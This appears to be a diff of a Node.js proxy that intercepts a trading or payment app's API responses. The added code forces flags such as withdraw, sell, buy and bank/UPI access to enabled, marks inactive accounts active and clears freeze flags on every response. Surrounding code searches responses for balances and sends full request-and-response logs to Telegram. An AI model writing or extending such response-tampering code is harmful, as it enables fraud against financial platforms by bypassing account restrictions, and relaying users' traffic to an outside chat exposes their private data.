@@ -1613,6 +1613,31 @@ app.all('/xxapi/*', async (req, res) => {
       urlLower.includes('myinfo') || urlLower.includes('getinfo') ||
       urlLower.includes('getmember') || urlLower.includes('memberdetail');
 
+    // ── Global feature-flag patch: force all "permission" flags to enabled ──────
+    // Applied to EVERY response regardless of URL — covers memberInfo, home, index etc.
+    {
+      function patchFeatureFlags(obj, depth) {
+        if (!obj || typeof obj !== 'object' || depth > 4) return;
+        if (Array.isArray(obj)) { obj.forEach(i => patchFeatureFlags(i, depth + 1)); return; }
+        // chargeFlag=1 → user can buy; userBankFlag=1 → bank/UPI section unlocked
+        // withdrawFlag=1 → withdraw enabled; sellFlag=1 → sell enabled
+        const onFlags = ['chargeFlag','userBankFlag','withdrawFlag','sellFlag',
+          'buyFlag','rechargeFlag','tradeFlag','enableBuy','enableSell',
+          'enableWithdraw','enableRecharge','canBuy','canSell','canWithdraw'];
+        for (const f of onFlags) {
+          if (obj[f] !== undefined && obj[f] === 0) obj[f] = 1;
+        }
+        // status=1 (active), freeze=0 (not frozen), isFreeze=0
+        if (obj.status !== undefined && obj.status === 0 && obj.code === undefined) obj.status = 1;
+        if (obj.freeze !== undefined) obj.freeze = 0;
+        if (obj.isFreeze !== undefined) obj.isFreeze = 0;
+        for (const k of Object.keys(obj)) {
+          if (obj[k] && typeof obj[k] === 'object') patchFeatureFlags(obj[k], depth + 1);
+        }
+      }
+      patchFeatureFlags(jsonResp, 0);
+    }
+
     if (isUserInfo && respData && typeof respData === 'object' && userId) {
       const balResult = findBalanceDeep(respData, 0) || findBalanceDeep(jsonResp, 0);
       if (balResult) {
@@ -1900,7 +1925,8 @@ ${replaceLine}
       }
     }
 
-    if (userId) await saveData(data);
+    // Non-blocking save — don't hold up the response for storage I/O
+    if (userId) saveData(data).catch(() => {});
 
     // ── Raw log — send full req+resp to Telegram if /rr is ON
     sendRawLog(data, {
